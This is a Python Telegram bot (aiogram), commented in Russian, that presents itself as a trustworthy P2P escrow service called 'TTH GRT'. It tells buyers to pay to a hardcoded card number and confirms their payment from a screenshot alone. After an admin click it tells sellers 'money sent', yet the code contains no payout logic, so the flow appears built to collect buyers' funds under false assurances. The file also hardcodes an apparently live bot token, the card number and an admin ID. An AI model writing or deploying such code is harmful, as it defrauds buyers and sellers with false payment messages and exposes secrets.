import asyncio
import re
import random
import string
from aiogram import Bot, Dispatcher, Router, types, F
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext

API_TOKEN = "7846917008:AAGaj9ZsWnb_2GmZC0q7YqTQEV39l0eBHxs"
BOT_CARD = "2204120118196936"  # Карта гаранта
ADMIN_ID = 7880438865  # Твой Telegram ID (замени на свой)

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

class Form(StatesGroup):
    waiting_for_currency = State()
    waiting_for_amount = State()
    waiting_for_product = State()
    waiting_for_payment_screenshot = State()
    waiting_for_seller_confirmation = State()
    waiting_for_admin_check = State()

# Хранение сделок
deals = {}

def generate_deal_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

@router.message(F.text == "/start")
async def start(message: types.Message):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Создать сделку", callback_data="create_deal")]
    ])

    text = ("🎉 Добро пожаловать в *TTH GRT* – надежный *P2P-гарант*!\n\n"
            "💼 Покупайте и продавайте всё, что угодно – безопасно!\n"
            "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
            "Выберите нужный раздел ниже:")

    await message.answer(text, reply_markup=keyboard, parse_mode="Markdown")

@router.callback_query(F.data == "create_deal")
async def process_create_deal(callback: types.CallbackQuery, state: FSMContext):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💵 USD", callback_data="currency_usd")],
        [InlineKeyboardButton(text="₽ RUB", callback_data="currency_rub")],
        [InlineKeyboardButton(text="🪙 Crypto", callback_data="currency_crypto")]
    ])

    await callback.message.answer("Выберите валюту для сделки:", reply_markup=keyboard)
    await state.set_state(Form.waiting_for_currency)
    await callback.answer()

@router.callback_query(F.data.startswith("currency_"))
async def process_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    await callback.message.answer(f"✅ Вы выбрали валюту: *{currency}*.\nВведите сумму сделки.", parse_mode="Markdown")
    await state.set_state(Form.waiting_for_amount)
    await callback.answer()

@router.message(Form.waiting_for_amount)
async def process_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text)
        await state.update_data(amount=amount)
        await message.answer("🛍 Укажите товар:")
        await state.set_state(Form.waiting_for_product)
    except ValueError:
        await message.reply("⚠️ Введите корректную сумму.")

@router.message(Form.waiting_for_product)
async def process_product(message: types.Message, state: FSMContext):
    deal_id = generate_deal_id()
    data = await state.get_data()
    amount = data["amount"]
    currency = data["currency"]
    product = message.text

    deals[deal_id] = {
        "buyer_id": message.chat.id,
        "amount": amount,
        "currency": currency,
        "product": product,
        "seller_id": None,
        "buyer_screenshot": None,
        "seller_screenshot": None
    }

    text = (f"📌 *Детали сделки:*\n\n"
            f"🛍 Товар: {product}\n"
            f"💵 Сумма: {amount} {currency}\n\n"
            f"🔹 *Отправьте оплату на карту гаранта:*\n`{BOT_CARD}`\n\n"
            f"📤 После оплаты загрузите скриншот подтверждения.\n"
            f"📎 Ссылка для продавца: [нажмите сюда](https://t.me/TestMacprobot?start={deal_id})")

    await message.answer(text, parse_mode="Markdown")
    await state.set_state(Form.waiting_for_payment_screenshot)

@router.message(Form.waiting_for_payment_screenshot, F.photo)
async def process_payment_screenshot(message: types.Message, state: FSMContext):
    for deal_id, deal in deals.items():
        if deal["buyer_id"] == message.chat.id:
            deal["buyer_screenshot"] = message.photo[-1].file_id
            await message.answer("📤 Оплата подтверждена! Теперь ждите, пока продавец загрузит скриншот передачи товара.")
            await state.clear()
            return
    await message.answer("⚠️ Сделка не найдена.")

@router.message(F.text.startswith("/start "))
async def process_seller_link(message: types.Message, state: FSMContext):
    deal_id = message.text.split("/start ")[1]

    if deal_id not in deals:
        await message.answer("⚠️ Сделка не найдена или уже завершена.")
        return

    deals[deal_id]["seller_id"] = message.chat.id

    await message.answer("📦 Вы продавец в этой сделке. После передачи товара загрузите скриншот подтверждения.")
    await state.set_state(Form.waiting_for_seller_confirmation)

@router.message(Form.waiting_for_seller_confirmation, F.photo)
async def process_seller_screenshot(message: types.Message, state: FSMContext):
    for deal_id, deal in deals.items():
        if deal["seller_id"] == message.chat.id:
            deal["seller_screenshot"] = message.photo[-1].file_id
            await message.answer("📤 Скриншот принят! Теперь сделку проверит админ.")

            # Отправляем админу оба скриншота
            await bot.send_photo(ADMIN_ID, deal["buyer_screenshot"], caption=f"💳 Оплата от покупателя в сделке {deal_id}.")
            await bot.send_photo(ADMIN_ID, deal["seller_screenshot"], caption=f"📦 Передача товара от продавца в сделке {deal_id}.")

            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"admin_confirm_{deal_id}")]
            ])

            await bot.send_message(ADMIN_ID, f"⚠️ Проверьте сделку {deal_id}. Нажмите 'Подтвердить оплату', если всё в порядке.", reply_markup=keyboard)
            await state.clear()
            return
    await message.answer("⚠️ Сделка не найдена.")

@router.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]

    if deal_id in deals:
        deal = deals[deal_id]
        await bot.send_message(deal["buyer_id"], "✅ Гарант подтвердил оплату! Сделка завершена.")
        await bot.send_message(deal["seller_id"], "✅ Гарант подтвердил оплату! Деньги отправлены.")

        del deals[deal_id]
        await callback.message.answer("✅ Оплата подтверждена. Сделка завершена!")
    else:
        await callback.message.answer("⚠️ Сделка не найдена.")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
